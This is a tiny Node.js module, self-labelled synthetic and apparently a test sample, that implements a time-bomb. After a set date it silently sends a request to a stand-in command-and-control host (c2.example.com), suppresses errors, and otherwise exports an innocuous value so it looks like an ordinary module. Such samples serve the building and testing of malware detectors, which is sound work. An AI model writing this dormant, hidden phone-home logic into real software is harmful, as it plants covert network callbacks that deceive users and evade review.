// SYNTHETIC. Time-bomb: stays dormant until a dormancy date has passed, then phones home.
const http = require('node:http');
if (Date.now() > Date.parse('2026-12-01')) {
  try { const r = http.request({ host: 'c2.example.com', port: 80, method: 'GET', path: '/ping' }); r.on('error', () => {}); r.end(); } catch {}
}
module.exports = 1;
